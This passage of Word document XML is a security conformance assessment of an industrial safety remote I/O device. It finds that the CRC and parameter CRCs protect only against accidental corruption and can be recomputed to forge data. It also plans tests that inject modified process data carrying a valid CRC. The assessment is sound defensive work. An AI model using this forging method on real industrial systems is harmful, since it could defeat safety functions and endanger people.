              <w:r w:rsidRPr="00690A16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513596BB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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Gap validation — your gaps are correct; here they are, scoped strictly to </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>protection</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (no audit):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FE45E00" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-1 (transmitted data — accurate, keep).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The CRC is a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>checksum, not a MAC</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. The CRC-Seed24/32 is a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>standardized, non-secret</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> value in the public GSD, so an attacker who modifies the process data and </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>recomputes a valid CRC</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is not detected. The device protects against </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>accidental</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> corruption but not </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>intentional</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">corruption — exactly the distinction RQ-002 draws. </w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId35" w:history="1">
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="46F6E637" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (stored parameters — extend your gap here).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">same limitation applies to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_ParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_ParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is only 16-bit</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (2¹⁶ space → no forgery resistance); the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is 32-bit but still non-cryptographic and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>recomputable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> from the public parameter layout. So the "accidental-only" protection gap covers the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>whole configuration path</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, not just process data. </w:t>
      </w:r>
      <w:hyperlink r:id="rId36" w:history="1">
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="08EA9903" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-3 (physical — accurate, scoped to resistance).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The seals provide </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>passive, visual tamper-resistance only</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. The device has </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no active tamper-detection mechanism</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> that would trigger a protective response to physical corruption of the switch interface. The one genuine device-level protection is the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>temporal one</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (switch read only at </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>init</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) — a runtime physical change is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ignored</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, which protects the running safety function, but the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>stored/next-boot address can still be corrupted</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> by physically altering the switch, and the seal is the only barrier.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(Note: whether such tampering is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>recorded</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is out of scope here — that is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-003</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId37" w:history="1">
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2AFCB114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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL/conformance conclusion (protection-scoped):</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-002 is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>partially met.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The transmitted frame and stored parameters are protected against </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>accidental</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> corruption (CRC/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_ParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> at </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL 1</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) but </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not intentional</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> corruption (no MAC/signature). The physical interface has </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>passive tamper-resistance (seals) + a temporal protection (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>init</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-only read)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, but </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no active tamper-detection/response</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → EDR 3.11 resistance limb partially met. Net: </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>protection against accidental corruption achieved; protection against intentional corruption not achieved.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B220D74" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00000000" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="2A8BE349">
          <v:rect id="_x0000_i1033" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="246AF608" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 2 — Methodological Test Planning (Scope-Corrected)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3642"/>
        <w:gridCol w:w="2176"/>
        <w:gridCol w:w="2238"/>
        <w:gridCol w:w="690"/>
      </w:tblGrid>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="26DD46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6D510C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CAFF6C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B57F57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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16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E313C8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 xml:space="preserve">Scientific </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16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7ABE24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SVV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="44D1E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199D0" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16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67FA6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 xml:space="preserve">Present a configuration with a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">wrong </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9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E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; verify rejection (EC3, stays in Parametrization)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C0143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Functional CR 3.4 in normal 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927DB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t>Requirements-based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verification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ABF18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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="25D86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F8D0A" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16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28C67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 xml:space="preserve">Bit-flip the payload </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>leaving CRC stale</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → CRC mismatch → passivation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91281B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Effectiveness of the CRC countermeasure under fault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C61BD" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">NIST SP 800-115 §5.2; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> CRC </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>theory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E3F8B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SVV-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="0818C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13F99" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16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1D98E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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Recompute a VALID CRC over MODIFIED process data</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and inject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3D18F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Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">: intentional </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>corruption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undetected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B44E6" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">MITRE ATT&amp;CK </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>for</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> ICS </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>T0836</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>Modify Parameter</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>T0856</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t>; NIST SP 800-115 §5.2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EFF67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SVV-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="5E9FB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542EC" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16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52E5B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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> forgery feasibility</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>analyse</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the 16-bit </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> / 32-bit </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> forgeability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00BA2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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Proves G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>: parameter CRCs are not authentication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B36FE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 xml:space="preserve">NIST SP 800-115 §4.3; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ifm</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> CM-010 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>boofuzz</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>) for the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992C1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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
